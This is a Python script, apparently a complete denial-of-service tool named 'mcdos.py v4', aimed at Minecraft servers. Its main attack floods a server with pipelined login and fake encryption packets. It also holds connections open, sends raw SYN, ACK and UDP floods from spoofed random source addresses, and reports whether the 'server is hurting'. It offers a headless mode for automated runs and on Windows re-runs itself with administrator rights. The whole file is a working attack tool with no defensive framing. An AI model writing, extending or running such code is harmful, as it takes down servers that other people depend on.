#!/usr/bin/env python3
"""mcdos.py v4 - pipelined auth burn. Interactive, or headless via MCDOS_* env."""
import ctypes, json, os, random, socket, struct, sys, threading, time

IS_WIN = os.name == "nt"
STOP = threading.Event()
CPU = os.cpu_count() or 4
CHILD = False
LINGER = struct.pack("HH" if IS_WIN else "ii", 1, 0)
AUTO = bool(os.environ.get("MCDOS_AUTO"))

def checksum(d):
    if len(d) & 1: d += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(d) // 2), d))
    s = (s >> 16) + (s & 0xFFFF); s += s >> 16
    return (~s) & 0xFFFF

def rand_ip(rng): return socket.inet_ntoa(struct.pack("!I", rng.randint(0x01000000, 0xDF000000)))

def varint(n):
    o = bytearray()
    while True:
        b = n & 0x7F; n >>= 7
        o.append(b | 0x80 if n else b)
        if not n: return bytes(o)

def frame(b): return varint(len(b)) + b
def mcs(s):
    e = s.encode(); return varint(len(e)) + e

def read_varint(sock):
    n = 0
    for i in range(5):
        b = sock.recv(1)
        if not b: raise OSError("eof")
        n |= (b[0] & 0x7F) << (7 * i)
        if not b[0] & 0x80: return n
    raise OSError("v")

def varint_at(b, i):
    n = 0
    for k in range(5):
        c = b[i]; i += 1
        n |= (c & 0x7F) << (7 * k)
        if not c & 0x80: return n, i
    raise OSError("v")

def read_packet(s):
    ln = read_varint(s); d = b""
    while len(d) < ln:
        c = s.recv(ln - len(d))
        if not c: raise OSError("eof")
        d += c
    return d

def ip_hdr(src, dst, proto, plen, ipid, ttl=64):
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + plen, ipid, 0, ttl, proto, 0,
                    socket.inet_aton(src), socket.inet_aton(dst))
    return h[:10] + struct.pack("!H", checksum(h)) + h[12:]

def tcp_seg(src, dst, sp, dp, seq, ack, fl, win=64240, pl=b"", op=b""):
    off = (5 + len(op) // 4) << 4
    seg = struct.pack("!HHIIBBHHH", sp, dp, seq, ack, off, fl, win, 0, 0) + op + pl
    ph = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(seg))
    return seg[:16] + struct.pack("!H", checksum(ph + seg)) + seg[18:]

def udp_dgram(sp, dp, p): return struct.pack("!HHHH", sp, dp, 8 + len(p), 0) + p

MSS = b"\x02\x04\x05\xb4"

def build_pool(v, dst, dport, n, rng):
    pool = []
    for _ in range(n):
        src, sp, ipid = rand_ip(rng), rng.randint(1024, 65535), rng.getrandbits(16)
        if v == "udp":
            b = udp_dgram(sp, dport, os.urandom(rng.randint(32, 700)))
            pool.append(ip_hdr(src, dst, 17, len(b), ipid) + b); continue
        seq, ack, win = rng.getrandbits(32), rng.getrandbits(32), rng.randint(1024, 64240)
        if v == "syn":   seg = tcp_seg(src, dst, sp, dport, seq, 0, 0x02, win, b"", MSS)
        elif v == "ack": seg = tcp_seg(src, dst, sp, dport, seq, ack, 0x10, win)
        else:            seg = tcp_seg(src, dst, sp, dport, seq, 0, 0x04, win)
        pool.append(ip_hdr(src, dst, 6, len(seg), ipid) + seg)
    return pool

def raw_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1); s.setblocking(False)
    for v in (8 << 20, 4 << 20, 1 << 20):
        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, v); break
        except OSError: pass
    return s

def raw_ok(dst):
    try:
        s = raw_socket()
        s.sendto(ip_hdr("10.0.0.1", dst, 17, 8, 1) + udp_dgram(1, 1, b"x"), (dst, 0))
        s.close(); return True
    except OSError: return False

def raw_worker(pool, dst, st):
    try: s = raw_socket()
    except OSError: return
    i, n = 0, len(pool)
    while not STOP.is_set():
        try: s.sendto(pool[i], (dst, 0)); st.add(1, len(pool[i]))
        except BlockingIOError: pass
        except OSError: st.add(e=1)
        i += 1
        if i >= n: i = 0

def mc_handshake(h, p, pr, s):
    return frame(varint(0x00) + varint(pr) + mcs(h) + struct.pack(">H", p) + varint(s))

def mc_login(name, pr):
    b = varint(0x00) + mcs(name)
    if pr >= 764: b += os.urandom(16)
    elif pr >= 760: b += b"\x00" + os.urandom(16)
    return frame(b)

def enc_resp():
    return frame(varint(0x01) + varint(128) + os.urandom(128) + varint(128) + os.urandom(128))

STATUS_REQ = b"\x01\x00"
PING = frame(varint(0x01) + struct.pack(">q", 0))

def rname(rng):
    return "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789_") for _ in range(rng.randint(4, 16)))

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.pkts = self.nbytes = self.conns = self.errs = self.auth = self.resp = self.fail = 0
        self.rtts = []
    def add(self, p=0, b=0, c=0, e=0, a=0, r=0):
        with self.lock:
            self.pkts += p; self.nbytes += b; self.conns += c
            self.errs += e; self.auth += a; self.resp += r
    def snap(self):
        with self.lock:
            r = self.rtts[:]; self.rtts.clear()
            return dict(pkts=self.pkts, bytes=self.nbytes, conns=self.conns, errs=self.errs,
                        auth=self.auth, resp=self.resp, rtt=r, fail=self.fail)

def dial(h, p, fam):
    s = socket.socket(fam, socket.SOCK_STREAM)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, LINGER)
    except OSError: pass
    s.settimeout(2)
    s.connect((h, p))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return s

def burn_worker(h, p, pr, st, rng, fam):
    while not STOP.is_set():
        s = None
        try:
            s = dial(h, p, fam)
            st.add(c=1)
            # pipelined: handshake + login start + encryption response in one write
            s.sendall(mc_handshake(h, p, pr, 2) + mc_login(rname(rng), pr) + enc_resp())
            st.add(a=1)
            s.settimeout(0.35)
            try:
                if read_packet(s): st.add(r=1)
            except OSError: pass
        except OSError:
            st.add(e=1)
        finally:
            if s:
                try: s.close()
                except OSError: pass

def hold_worker(h, p, pr, st, rng, fam, hold):
    held = []
    while not STOP.is_set():
        try:
            while held and time.time() - held[0][1] > hold:
                x, _ = held.pop(0)
                try: x.close()
                except OSError: pass
            s = dial(h, p, fam); st.add(c=1)
            s.sendall(mc_handshake(h, p, pr, 2))
            held.append((s, time.time()))
        except OSError: st.add(e=1)
    for x, _ in held:
        try: x.close()
        except OSError: pass

def probe(h, p, pr, st, fam):
    while not STOP.is_set():
        t = time.perf_counter()
        try:
            s = dial(h, p, fam); s.settimeout(4)
            s.sendall(mc_handshake(h, p, pr, 1) + STATUS_REQ + PING)
            if s.recv(16): st.rtts.append((time.perf_counter() - t) * 1000)
            s.close()
        except OSError:
            with st.lock: st.fail += 1
        time.sleep(0.5)

def status_probe(h, p, fam):
    s = dial(h, p, fam); s.settimeout(5)
    s.sendall(mc_handshake(h, p, 767, 1) + STATUS_REQ)
    d = read_packet(s); s.close()
    _, i = varint_at(d, 0); ln, i = varint_at(d, i)
    return json.loads(d[i:i + ln].decode("utf-8", "replace"))

def login_probe(h, p, pr, fam):
    try:
        s = dial(h, p, fam); s.settimeout(5)
        s.sendall(mc_handshake(h, p, pr, 2) + mc_login("VeniceProbe", pr))
        d = read_packet(s); s.close()
        pid, _ = varint_at(d, 0)
        return "auth" if pid == 0x01 else "other"
    except OSError as e: return f"err:{e}"

def find_proto(h, p, fam, hint):
    for pr in [hint, 767, 766, 765, 764, 763, 762, 761, 760, 758, 754, 47]:
        if pr and login_probe(h, p, pr, fam) == "auth": return pr, "auth"
    return hint or 767, "weak"

def family(h, p):
    try:
        for i in socket.getaddrinfo(h, p, socket.AF_INET6, socket.SOCK_STREAM):
            try:
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                s.settimeout(3); s.connect(i[4]); s.close()
                return socket.AF_INET6, i[4][0], "v6"
            except OSError: pass
    except OSError: pass
    return socket.AF_INET, socket.gethostbyname(h), "v4"

def run(host, port, vec, dur, th, pr, hold, fam, addr):
    st = Stats(); rng = random.Random()
    raw_v = [v for v in vec if v in ("udp", "syn", "ack", "rst")]
    v4 = socket.gethostbyname(host)
    ok = bool(raw_v) and raw_ok(v4) and not os.environ.get("MCDOS_NO_RAW")
    if raw_v and not ok: print("  ! raw off")
    ws = []
    for v in vec:
        if v in raw_v:
            if not ok: continue
            for _ in range(max(4, min(12, CPU // 2))):
                ws.append(threading.Thread(target=raw_worker,
                          args=(build_pool(v, v4, port, 4096, rng), v4, st), daemon=True))
        elif v == "burn":
            for _ in range(th):
                ws.append(threading.Thread(target=burn_worker,
                          args=(addr, port, pr, st, random.Random(), fam), daemon=True))
        elif v == "connect":
            for _ in range(max(8, th // 4)):
                ws.append(threading.Thread(target=hold_worker,
                          args=(addr, port, pr, st, random.Random(), fam, hold), daemon=True))

    threading.Thread(target=probe, args=(addr, port, pr, st, fam), daemon=True).start()
    print(f"\n  {host}:{port} -> {addr} [{fam}] proto {pr} {dur}s threads {th}\n")
    for i, w in enumerate(ws):
        w.start()
        if i % 16 == 15: time.sleep(0.02)

    t0, lp, lb = time.time(), 0, 0
    base, pp, pr2 = [], 0, 0.0
    for _ in range(dur):
        time.sleep(1)
        s = st.snap()
        p, b = s["pkts"] - lp, s["bytes"] - lb
        lp, lb = s["pkts"], s["bytes"]
        pp = max(pp, p)
        if s["rtt"]:
            pr2 = max(pr2, max(s["rtt"]))
            if len(base) < 5: base += s["rtt"]
        r = round(sum(s["rtt"]) / len(s["rtt"]), 1) if s["rtt"] else None
        print(f"  [{int(time.time()-t0):>4}s] {p:>7}pps {b*8/1e6:>7.2f}Mb "
              f"conn {s['conns']:>6} err {s['errs']:>6} auth {s['auth']:>6} "
              f"resp {s['resp']:>6} rtt {'-' if r is None else str(r)+'ms':>9} fail {s['fail']}")
    STOP.set(); time.sleep(0.4)
    f = st.snap(); bl = sum(base)/len(base) if base else 0
    print(f"\n  {f['conns']} conns, {f['auth']} auth sent, {f['resp']} confirmed, "
          f"rtt {bl:.0f}->{pr2:.0f}ms, fails {f['fail']}")
    if f["auth"] < 500: print("  VERDICT: low throughput, add sources")
    elif f["fail"] > 10 or (bl and pr2 > bl * 5): print("  VERDICT: server is hurting")
    else: print("  VERDICT: absorbed, add sources")

def ask(p, d=""):
    v = input(f"  {p}{' ['+str(d)+']' if d != '' else ''}: ").strip()
    return v if v else str(d)

def main():
    global CHILD
    if AUTO:
        host, port = os.environ["MCDOS_TARGET"].rsplit(":", 1)
        port = int(port)
        fam, addr, _ = family(host, port)
        pr, _ = find_proto(addr, port, fam, 767)
        vec = os.environ.get("MCDOS_VECTORS", "burn").split(",")
        run(host, port, vec, int(os.environ.get("MCDOS_SECONDS", 300)),
            int(os.environ.get("MCDOS_THREADS", 400)), pr, 8, fam, addr)
        return
    print("\n" + "=" * 52 + "\n  MCDOS v4\n" + "=" * 52)
    if IS_WIN:
        os.system("netsh int ipv4 set dynamicport tcp start=1025 num=64511 >nul 2>&1")
    if IS_WIN and not ctypes.windll.shell32.IsUserAnAdmin():
        print("\n  elevating..."); CHILD = True
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                    " ".join(f'"{a}"' for a in sys.argv), None, 1)
        return
    host = ask("Target IP or hostname")
    port = int(ask("Port", 25565))
    fam, addr, lab = family(host, port)
    print(f"\n  {lab}: {addr}")
    try:
        i = status_probe(addr, port, fam); v = i.get("version", {})
        print(f"  online: {v.get('name')} proto {v.get('protocol')} "
              f"{i.get('players',{}).get('online')}/{i.get('players',{}).get('max')}")
        hint = v.get("protocol")
    except Exception as e:
        print(f"  status failed: {e}"); hint = None
    pr, res = find_proto(addr, port, fam, hint)
    print(f"  proto {pr} -> {res}")
    vec = ["burn"]
    dur = int(ask("Duration seconds", 300))
    th = int(ask("Burn threads", 400))
    if ask("Include connect-hold? (y/N)", "n").lower().startswith("y"):
        vec.append("connect")
    if ask("Include L3/4 raw? (y/N)", "n").lower().startswith("y"):
        vec += ["syn", "ack", "udp"]
    print(f"\n  {', '.join(vec)}")
    if ask("Start? (Y/n)", "y").lower().startswith("n"): return
    try: run(host, port, vec, dur, th, pr, 8, fam, addr)
    except KeyboardInterrupt: STOP.set()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: STOP.set()
    if IS_WIN and CHILD: input("\n  Enter...")